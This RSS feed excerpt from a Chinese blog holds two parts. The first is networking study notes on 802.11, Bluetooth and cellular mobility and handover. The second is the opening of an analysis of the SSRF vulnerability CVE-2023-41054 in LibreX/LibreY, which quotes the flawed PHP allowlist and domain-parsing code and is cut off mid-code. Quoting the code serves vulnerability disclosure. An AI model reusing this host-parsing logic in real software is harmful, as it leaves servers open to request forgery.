<p>如<a href="#wireless-links-and-network-characteristics">上文</a>所述<span class="mojikumi-line-end">，</span>不同环境下 SNR 不同会导致最佳的 transmission rate 不同<span class="mojikumi-line-end">。</span>在 802.11 中<span class="mojikumi-line-end">，</span>ACK 可以用作 rate adaptation 的 hint<span class="mojikumi-line-end">，</span>在没收到 ACK 时降低 transmission rate<span class="mojikumi-line-end">，</span>在连续收到很多 ACK 时提高 transmission rate<span class="mojikumi-line-end">，</span>这与 <a href="/post/2023/06/cnatda-3#classic-tcp-congestion-control">TCP 的 congestion control</a> 类似<span class="mojikumi-line-end">。</span></p>
<h4 id="802-11-power-management" class="heading"><a href="#802-11-power-management" class="heading-anchor" aria-label="章节： 802.11 Power Management" tabindex="-1"></a><span>802.11 Power Management</span></h4>
<p>一个 802.11 node 往往不需要一直通信<span class="mojikumi-line-end">，</span>在不进行通信的时候可以 sleep 来 save power<span class="mojikumi-line-end">：</span></p>
<ol>
<li>node 可以在 header 中设置 power management flag 来告诉 AP 自己即将 sleep<span class="mojikumi-line-end">。</span></li>
<li>如果 AP 接收到一个发送给正在 sleep 的 node 的 frame<span class="mojikumi-line-end">，</span>会将其存在 buffer 中<span class="mojikumi-line-end">。</span></li>
<li>AP 发送的 beacon frame 中包含一个有 buffered frame 的 node list<span class="mojikumi-line-end">，</span>node 会在 AP 发送 beacon frame 前 wake up<span class="mojikumi-line-end">，</span>根据自己是否有 buffered frame 来请求 AP 发送这些 buffered frame 或继续 sleep<span class="mojikumi-line-end">。</span></li>
</ol>
<p>一般来说<span class="mojikumi-line-end">，</span>AP 会周期性地每 100ms 发送一次 beacon frame<span class="mojikumi-line-end">，</span>而一次 wakeup 只需 250μs<span class="mojikumi-line-end">，</span>所以不进行通信的 station 可以在 99% 的时间内 sleep<span class="mojikumi-line-end">。</span></p>
<h2 id="personal-area-networks-bluetooth" class="heading"><a href="#personal-area-networks-bluetooth" class="heading-anchor" aria-label="章节： Personal Area Networks: Bluetooth" tabindex="-1"></a><span>Personal Area Networks: Bluetooth</span></h2>
<p>Bluetooth 使用 TDM 进行 channel partitioning<span class="mojikumi-line-end">，</span>同时在 79 个 frequency channel 中进行 pseudo-random 的 channel hopping (<i>frequency-hopping spread spectrum</i>, FHSS) 来降低外界干扰的影响<span class="mojikumi-line-end">。</span></p>
<p>Bluetooth network 是 ad hoc (infrastructure-less) 的<span class="mojikumi-line-end">，</span>一个 Bluetooth network 包含最多 8 个 active device<span class="mojikumi-line-end">，</span>其中一个是 master device<span class="mojikumi-line-end">，</span>它决定传输的 clock<span class="mojikumi-line-end">、</span>frequency-hopping pattern<span class="mojikumi-line-end">、</span>power<span class="mojikumi-line-end">，</span>邀请 client 进入 Bluetooth network<span class="mojikumi-line-end">，</span>通过 polling 来控制 client 何时通信<span class="mojikumi-line-end">。</span>network 中还可以有最多 255 个 parked device<span class="mojikumi-line-end">，</span>会长期处于 sleep mode<span class="mojikumi-line-end">，</span>周期性地接收 beacon message<span class="mojikumi-line-end">，</span>只有切换为 active 才能进行通信<span class="mojikumi-line-end">。</span></p>
<p>Bluetooth network 的建立过程为<span class="mojikumi-line-end">：</span></p>
<ol>
<li>neighbor discovery:
<ol>
<li>master 广播 inquiry message<span class="mojikumi-line-end">，</span>在 32 个不同的 frequency 发送至多 128 遍<span class="mojikumi-line-end">，</span>因为此时还没有协商好 frequency-hopping pattern<span class="mojikumi-line-end">。</span></li>
<li>client 收到 inquiry message 后<span class="mojikumi-line-end">，</span>随机等待 0~300ms 来避免 collision<span class="mojikumi-line-end">，</span>然后发送 response<span class="mojikumi-line-end">，</span>包含 client 的 device ID<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
<li>Bluetooth paging:
<ol>
<li>master 向特定的 client 发送 paging invitation<span class="mojikumi-line-end">，</span>依然是在 32 个不同的 frequency<span class="mojikumi-line-end">。</span></li>
<li>client 收到 paging invitation 后返回 acknowledgment<span class="mojikumi-line-end">。</span></li>
<li>master 向 client 发送 frequency-hopping pattern<span class="mojikumi-line-end">、</span>clock synchronization information 以及 active member address<span class="mojikumi-line-end">。</span></li>
<li>使用 frequency-hopping pattern 来 poll client<span class="mojikumi-line-end">，</span>以确认 client 连上了<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
</ol>
<h2 id="mobility-management-principles" class="heading"><a href="#mobility-management-principles" class="heading-anchor" aria-label="章节： Mobility Management: Principles" tabindex="-1"></a><span>Mobility Management: Principles</span></h2>
<a id="7-4-cellular-networks-4g-and-5g" name="7-4-cellular-networks-4g-and-5g" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-green-2 dark:bg-green-9 b-green-5" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h3 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-lightbulb-outline text-green" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Hint: </span><span data-v-a2ab257f>7.4 Cellular Networks: 4G and 5G</span></h3><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>7.4 这一节<span class="mojikumi-line-end">，</span>感觉可以直接跳过<span class="mojikumi-line-end">，</span>或者简单扫一眼<span class="mojikumi-line-end">。</span></p><ul>
<li>7.4.1<span class="mojikumi-line-end">：</span>没看 7.5<span class="mojikumi-line-end">、</span>7.6 的话感觉会完全不知道它在说什么<span class="mojikumi-line-end">，</span>看了 7.6 之后也不太需要回过头来看这里了<span class="mojikumi-line-end">。</span></li>
<li>7.4.2~7.4.5<span class="mojikumi-line-end">：</span>非常简略<span class="mojikumi-line-end">，</span>没什么东西<span class="mojikumi-line-end">。</span></li>
<li>7.4.6<span class="mojikumi-line-end">：</span>5G 的科普<span class="mojikumi-line-end">，</span>除了大家耳熟能详的以及过于简略的<span class="mojikumi-line-end">，</span>感觉就一条<span class="mojikumi-line-end">：</span>5G 为了提升 transmission rate<span class="mojikumi-line-end">，</span>base station 需要建得更密集<span class="mojikumi-line-end">。</span></li>
</ul><p>说到底<span class="mojikumi-line-end">，</span>这样编排说是为了将 <span class="mojikumi">“</span>wireless<span class="mojikumi">”</span> 和 <span class="mojikumi">“</span>mobility<span class="mojikumi">”</span> 这两方面的问题分开讨论<span class="mojikumi-line-end">。</span>但是<span class="mojikumi">，</span><wbr><span class="mojikumi-line-start">“</span>wireless<span class="mojikumi">”</span> 的部分在 802.11 已经讲得差不多了<span class="mojikumi-line-end">，</span>细节上会有差异但书上也没有细讲<span class="mojikumi-line-end">。</span>其实讲 cellular network 主要就是要讲它的 mobility<span class="mojikumi-line-end">，</span>所以 7.5<span class="mojikumi-line-end">、</span>7.6 就够了<span class="mojikumi-line-end">。</span></p></div></div></aside>
<p>mobility 指的是 mobile device 到网络的接入点发生变化<span class="mojikumi-line-end">，</span>而从 network layer 的角度来看<span class="mojikumi-line-end">，</span>只有 access network 发生了变化且需要保持连接<span class="mojikumi-line-start">（</span>例如 TCP connection<span class="mojikumi-line-end">）</span>不中断<span class="mojikumi-line-end">，</span>才会带来 mobility issue<span class="mojikumi-line-end">。</span>如果设备在每个 session 只连到同一个接入点<span class="mojikumi-line-end">，</span>则不需要特殊处理<span class="mojikumi-line-end">。</span></p>
<p>在 cellular network 中<span class="mojikumi-line-end">，</span>有两方面的 mobility issue:</p>
<ul>
<li>handover: cellular network 中有很多 base station<span class="mojikumi-line-end">，</span>每个 base station 覆盖一个 cell 提供服务<span class="mojikumi-line-end">。</span>从一个 base station 移动到另一个 base station 时<span class="mojikumi-line-end">，</span>需要进行 handover 来改变 mobile device 连接到的 base station<span class="mojikumi-line-end">。</span></li>
<li>roaming on visited networks: 每个 cellular subscriber 会有一个 <i>home network</i><span class="mojikumi-line-end">，</span>提供了 subscriber 信息的集中管理<span class="mojikumi-line-end">。</span>home network 提供服务的范围是有限的<span class="mojikumi-line-end">，</span>如果 mobile device 移动到了 home network 之外<span class="mojikumi-line-end">，</span>可能就需要连接到由其他 cellular provider 提供的 <i>visited network</i><span class="mojikumi-line-end">，</span>此时需要特别的机制来处理 routing<span class="mojikumi-line-end">。</span></li>
</ul>
<p>mobile device 的接入点随时可能发生变化<span class="mojikumi-line-end">，</span>而 home network 会跟踪 device 当前接入的 visited network<span class="mojikumi-line-end">，</span>所以外界可以通过 home network 来找到 mobile device 当前的位置从而进行通信<span class="mojikumi-line-end">。</span></p>
<p>具体的 routing 有两种方式<span class="mojikumi-line-end">：</span></p>
<ul>
<li>indirect: mobile device 有一个固定的 IP<span class="mojikumi-line-end">，</span>外界向这个 IP 发送消息会发到 home network 的 gateway<span class="mojikumi-line-end">，</span>而 home network 与 visited network 的 gateway 之间建立了 tunnel<span class="mojikumi-line-end">，</span>最后由 visited network 的 gateway 与 mobile device 通信<span class="mojikumi-line-end">。</span>也就是说<span class="mojikumi-line-end">，</span>外界与 mobile device 通信需要经过 home network 中转<span class="mojikumi-line-end">。</span></li>
<li>direct: 向 mobile device 发送消息时<span class="mojikumi-line-end">，</span>一开始先查询 mobile device 所在的 visited network<span class="mojikumi-line-end">，</span>后续则直接与 visited network 通信<span class="mojikumi-line-end">。</span></li>
</ul>
<p>indirect routing 的缺点在于 <i>triangle routing problem</i><span class="mojikumi-line-end">，</span>即通过 home network 中转可能带来很大的浪费<span class="mojikumi-line-end">。</span>direct routing 的问题在于<span class="mojikumi-line-end">，</span>需要特殊的机制来完成一开始的 visited network 查询以及后续 visited network 变更时的通知<span class="mojikumi-line-end">，</span>也就是说需要通信另一方的配合<span class="mojikumi-line-end">。</span></p>
<h2 id="mobility-management-in-4g5g-networks" class="heading"><a href="#mobility-management-in-4g5g-networks" class="heading-anchor" aria-label="章节： Mobility Management in 4G/5G Networks" tabindex="-1"></a><span>Mobility Management in 4G/5G Networks</span></h2>
<h3 id="attach-to-visited-network" class="heading"><a href="#attach-to-visited-network" class="heading-anchor" aria-label="章节： Attach to Visited Network" tabindex="-1"></a><span>Attach to Visited Network</span></h3>
<p>连接到 base station 时<span class="mojikumi-line-end">，</span>mobile device 会提供自己的 IMSI (<i>international mobile subscriber identity</i>)<span class="mojikumi-line-end">。</span>visited network 的 MME (<i>mobility management entity</i>) 会从 local cache 或 home network 的 HSS (<i>home subscriber server</i>) 获取到 mobile device 的 authentication<span class="mojikumi-line-end">、</span>encryption<span class="mojikumi-line-end">、</span>quality of service 等信息<span class="mojikumi-line-end">，</span>并通知 home network 的 HSS<span class="mojikumi-line-end">，</span>mobile device 现在位于这个 visited network<span class="mojikumi-line-end">。</span></p>
<p>然后<span class="mojikumi-line-end">，</span>会建立两个 tunnel<span class="mojikumi-line-end">，</span>从 mobile device 到 visited network 的 <i>serving gateway</i><span class="mojikumi-line-end">，</span>再从 serving gateway 到 home network 的 PDN (<i>packet data network</i>) gateway<span class="mojikumi-line-end">。</span>这两个 tunnel 使用 <i>GPRS tunneling protocol</i> (GTP)<span class="mojikumi-line-end">，</span>原理类似于 <a href="/post/2023/06/cnatda-4#ipv6">IPv6 tunneling</a><span class="mojikumi-line-end">。</span></p>
<a id="local-breakout" name="local-breakout" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-purple-2 dark:bg-purple-9 b-purple-5" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-help-circle-outline text-purple" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Question: </span><span data-v-a2ab257f>local breakout</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>书上前后提到两次 local breakout<span class="mojikumi-line-end">，</span>给我整懵了<span class="mojikumi-line-end">，</span>它到底是 direct 还是 indirect<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">；</span>好像也不重要<span class="mojikumi-line-end">，</span>当它不存在就好<span class="mojikumi-line-start">（</span></p></div></div></aside>
<h3 id="handover-management" class="heading"><a href="#handover-management" class="heading-anchor" aria-label="章节： Handover Management" tabindex="-1"></a><span>Handover Management</span></h3>
<p>handover 是 mobile device 从一个 base station 转移到邻近的另一个 base station 的过程<span class="mojikumi-line-end">。</span>这可能是从信号差的 base station 转到信号好的<span class="mojikumi-line-end">，</span>或者是从拥挤的转到畅通的<span class="mojikumi-line-end">。</span>mobile device 会周期性地向当前连接到的 base station (称作 <i>source</i> base station) 报告它接收到的各个 base station 的信号强度等信息<span class="mojikumi-line-end">，</span>而 source base station 可以根据它掌握的信息来做出 handover 的决定<span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>在同一个 network 中<span class="mojikumi-line-end">）</span>handover 的过程如下<span class="mojikumi-line-end">：</span></p>
<ol>
<li>source base station 选择一个 <i>target</i> base station<span class="mojikumi-line-end">，</span>发送 handover request<span class="mojikumi-line-end">。</span></li>
<li>如果 target base station 同意<span class="mojikumi-line-end">，</span>会提前分配好连接所需的资源<span class="mojikumi-line-start">（</span>从而让 handover 能够尽快完成<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>然后发送 handover request acknowledge<span class="mojikumi-line-end">，</span>包含连接所需的各项信息<span class="mojikumi-line-end">。</span></li>
<li>source base station 告诉 mobile device 连接到 target base station 所需的信息<span class="mojikumi-line-end">。</span>此时在 mobile device 看来 handover 已经结束了<span class="mojikumi-line-end">，</span>可以和 target base station 进行通信<span class="mojikumi-line-end">。</span></li>
<li>source base station 停止向 mobile device 转发<span class="mojikumi-line-end">，</span>而是转发给 target base station<span class="mojikumi-line-end">。</span></li>
<li>target base station 告诉 MME 自己是这个 mobile device 新连接到的 base station<span class="mojikumi-line-end">，</span>MME 会更新 serving gateway 到 base station 的 tunnel 的 end point<span class="mojikumi-line-end">。</span></li>
<li>target base station 告诉 source base station<span class="mojikumi-line-end">，</span>新的 tunnel 已经配置好了<span class="mojikumi-line-end">，</span>source base station 可以释放为这个 mobile device 提供的资源了<span class="mojikumi-line-end">。</span></li>
<li>target base station 向 mobile device 发送之前由 source base station 转发来的 datagram<span class="mojikumi-line-end">，</span>之后就可以正常通信了<span class="mojikumi-line-end">。</span></li>
</ol>
<h2 id="wireless-and-mobility-impact-on-higher-layer-protocols" class="heading"><a href="#wireless-and-mobility-impact-on-higher-layer-protocols" class="heading-anchor" aria-label="章节： Wireless and Mobility: Impact on Higher-Layer Protocols" tabindex="-1"></a><span>Wireless and Mobility: Impact on Higher-Layer Protocols</span></h2>
<h3 id="impact-on-tcp" class="heading"><a href="#impact-on-tcp" class="heading-anchor" aria-label="章节： Impact on TCP" tabindex="-1"></a><span>Impact on TCP</span></h3>
<p>TCP 以 retransmission 作为 congestion 的标志进行 congestion control<span class="mojikumi-line-end">，</span>但在 wireless network 中<span class="mojikumi-line-end">，</span>bit error 更加常见<span class="mojikumi-line-end">，</span>而 handover 时也会带来 delay 或丢包<span class="mojikumi-line-end">，</span>所以 retransmission 不一定意味着 network congestion<span class="mojikumi-line-end">，</span>如果在 wireless network 中沿用一般的 TCP congestion control 可能会有性能问题<span class="mojikumi-line-end">。</span></p>
<p>目前的解决途径有<span class="mojikumi-line-end">：</span></p>
<ul>
<li>local recovery<span class="mojikumi-line-end">：</span>在 link layer 提供 reliable data transfer<span class="mojikumi-line-end">，</span>减少 bit error 的影响<span class="mojikumi-line-end">。</span></li>
<li>split-connection<span class="mojikumi-line-end">：</span>在 sender 到 base station<span class="mojikumi-line-end">、</span>base station 到 receiver 分别建立连接<span class="mojikumi-line-end">。</span>base station 到 mobile host 的连接可以是标准的 TCP 连接<span class="mojikumi-line-end">，</span>也可以是其他连接<span class="mojikumi-line-end">。</span></li>
<li>让通信双方意识到 wireless link 的存在<span class="mojikumi-line-end">，</span>并区分出 retransmission 是否由 congestion 引起<span class="mojikumi-line-end">。</span></li>
</ul>
<h3 id="impact-on-applications" class="heading"><a href="#impact-on-applications" class="heading-anchor" aria-label="章节： Impact on Applications" tabindex="-1"></a><span>Impact on Applications</span></h3>
<ul>
<li>wireless network 的 bandwidth 通常较小<span class="mojikumi-line-end">，</span>所以为 mobile device 提供服务时更需要减少传输的数据量<span class="mojikumi-line-end">。</span></li>
<li>mobility 使得 location-aware / context-aware application 成为可能<span class="mojikumi-line-end">。</span></li>
</ul>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-fig-7.13">
<p>p554, Figure 7.13: The 802.11 frame <a href="#user-content-fnref-fig-7.13" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/cnatda">cnatda</category>
            <category domain="https://ouuan.moe/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</category>
        </item>
        <item>
            <title><![CDATA[CVE-2023-41054 漏洞分析]]></title>
            <link>https://ouuan.moe/post/2023/09/cve-2023-41054</link>
            <guid>https://ouuan.moe/post/2023/09/cve-2023-41054</guid>
            <pubDate>Tue, 05 Sep 2023 16:11:15 GMT</pubDate>
            <description><![CDATA[<p><a href="https://github.com/hnhx/librex">LibreX</a>/<a href="https://github.com/Ahwxorg/LibreY">Y</a> 对 URL host 的错误解析导致了 SSRF 漏洞<span class="mojikumi-line-end">，</span>攻击者可以绕过对 host 的检查向任意 URL 发送 GET request 并获取 response body<span class="mojikumi-line-end">，</span>从而访问内网资源或进行 DoS 攻击<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[<p><a href="https://github.com/hnhx/librex">LibreX</a>/<a href="https://github.com/Ahwxorg/LibreY">Y</a> 对 URL host 的错误解析导致了 SSRF 漏洞<span class="mojikumi-line-end">，</span>攻击者可以绕过对 host 的检查向任意 URL 发送 GET request 并获取 response body<span class="mojikumi-line-end">，</span>从而访问内网资源或进行 DoS 攻击<span class="mojikumi-line-end">。</span></p>

<ul>
<li><a href="https://github.com/Ahwxorg/LibreY/security/advisories/GHSA-p4f9-h8x8-mpwf">LibreY Server-Side Request Forgery (SSRF) vulnerability in image_proxy.php · Advisory</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41054">CVE-2023-41054</a></li>
</ul>
<h2 id="代码分析" class="heading"><a href="#代码分析" class="heading-anchor" aria-label="章节： 代码分析" tabindex="-1"></a><span>代码分析</span></h2>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h3 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="PHP 代码块" data-v-ad49d235>PHP</h3><ile-root id="ile-40"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-40--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$url</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">$_REQUEST</span><span style="color: #D6DEEB">[</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">url</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">]; </span></span>
<span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$requested_root_domain</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">get_root_domain</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">url</span><span style="color: #D6DEEB">); </span></span>
<span><span style="color: #D6DEEB">  </span></span>
<span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$allowed_domains</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">array</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">qwant.com</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">wikimedia.org</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, </span><span style="color: #82AAFF">get_root_domain</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">config</span><span style="color: #7FDBCA">-&gt;invidious_instance_for_video_results</span><span style="color: #D6DEEB">)); </span></span>
<span><span style="color: #D6DEEB">  </span></span>
<span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">in_array</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">requested_root_domain</span><span style="color: #D6DEEB">,</span><span style="color: #82AAFF"> </span><span style="color: #D6DEEB">$</span><span style="color: #BEC5D4">allowed_domains</span><span style="color: #D6DEEB">)) </span></span>
<span><span style="color: #D6DEEB"> { </span></span>
<span><span style="color: #D6DEEB">   </span><span style="color: #BEC5D4">$image</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$url</span><span style="color: #D6DEEB">; </span></span>
<span><span style="color: #D6DEEB">   </span><span style="color: #BEC5D4">$image_src</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">request</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">image</span><span style="color: #D6DEEB">); </span></span>
<span><span style="color: #D6DEEB">  </span></span>
<span><span style="color: #D6DEEB">   </span><span style="color: #C5E478">header</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">Content-Type: image/png</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">); </span></span>
<span><span style="color: #D6DEEB">   </span><span style="color: #C5E478">echo</span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$image_src</span><span style="color: #D6DEEB">;</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53"> </span><span style="color: #111111">$url</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">$_REQUEST</span><span style="color: #403F53">[</span><span style="color: #111111">&quot;</span><span style="color: #C96765">url</span><span style="color: #111111">&quot;</span><span style="color: #403F53">]; </span></span>
<span><span style="color: #403F53"> </span><span style="color: #111111">$requested_root_domain</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">get_root_domain</span><span style="color: #403F53">($</span><span style="color: #111111">url</span><span style="color: #403F53">); </span></span>
<span><span style="color: #403F53">  </span></span>
<span><span style="color: #403F53"> </span><span style="color: #111111">$allowed_domains</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">array</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">qwant.com</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">wikimedia.org</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, </span><span style="color: #4876D6">get_root_domain</span><span style="color: #403F53">($</span><span style="color: #111111">config</span><span style="color: #0C969B">-&gt;</span><span style="color: #111111">invidious_instance_for_video_results</span><span style="color: #403F53">)); </span></span>
<span><span style="color: #403F53">  </span></span>
<span><span style="color: #403F53"> </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #4876D6">in_array</span><span style="color: #403F53">($</span><span style="color: #111111">requested_root_domain</span><span style="color: #403F53">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">$</span><span style="color: #111111">allowed_domains</span><span style="color: #403F53">)) </span></span>
<span><span style="color: #403F53"> { </span></span>
<span><span style="color: #403F53">   </span><span style="color: #111111">$image</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">$url</span><span style="color: #403F53">; </span></span>
<span><span style="color: #403F53">   </span><span style="color: #111111">$image_src</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">request</span><span style="color: #403F53">($</span><span style="color: #111111">image</span><span style="color: #403F53">); </span></span>
<span><span style="color: #403F53">  </span></span>
<span><span style="color: #403F53">   </span><span style="color: #4876D6">header</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">Content-Type: image/png</span><span style="color: #111111">&quot;</span><span style="color: #403F53">); </span></span>
<span><span style="color: #403F53">   </span><span style="color: #4876D6">echo</span><span style="color: #403F53"> </span><span style="color: #111111">$image_src</span><span style="color: #403F53">;</span></span></code></pre></div></section>
<p>这里检查了 proxy 到的目标 URL 域名在一个允许列表之中<span class="mojikumi-line-end">，</span>但是 <code>get_<wbr>root_<wbr>domain</code> 是一个自己写的函数<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h3 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="PHP 代码块" data-v-ad49d235>PHP</h3><ile-root id="ile-41"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-41--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">function</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">get_root_domain</span><span style="color: #D9F5DD">(</span><span style="color: #BEC5D4">$url</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB"> { </span></span>
<span><span style="color: #D6DEEB">     </span><span style="color: #BEC5D4">$split_url</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">explode</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">/</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">,</span><span style="color: #82AAFF"> </span><span style="color: #D6DEEB">$</span><span style="color: #BEC5D4">url</span><span style="color: #D6DEEB">); </span></span>
<span><span style="color: #D6DEEB">     </span><span style="color: #BEC5D4">$base_url</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$split_url</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">]; </span></span>
<span><span style="color: #D6DEEB">  </span></span>
<span><span style="color: #D6DEEB">     </span><span style="color: #BEC5D4">$base_url_main_split</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">explode</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">.</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">strrev</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">base_url</span><span style="color: #D6DEEB">)); </span></span>
<span><span style="color: #D6DEEB">     </span><span style="color: #BEC5D4">$root_domain</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">strrev</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">base_url_main_split</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">]) </span><span style="color: #7FDBCA">.</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">.</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">.</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">strrev</span><span style="color: #D6DEEB">($</span><span style="color: #BEC5D4">base_url_main_split</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">]); </span></span>
<span><span style="color: #D6DEEB">  </span></span>
<span><span style="color: #D6DEEB">     </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> </span><span style="color: #BEC5D4">$root_domain</span><span style="color: #D6DEEB">; </span></span>
<span><span style="color: #D6DEEB"> }</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53"> </span><span style="color: #994CC3">function</span><span style="color: #403F53"> </span><span style="color: #4876D6">get_root_domain</span><span style="color: #111111">($url)</span><span style="color: #403F53"> { </span></span>
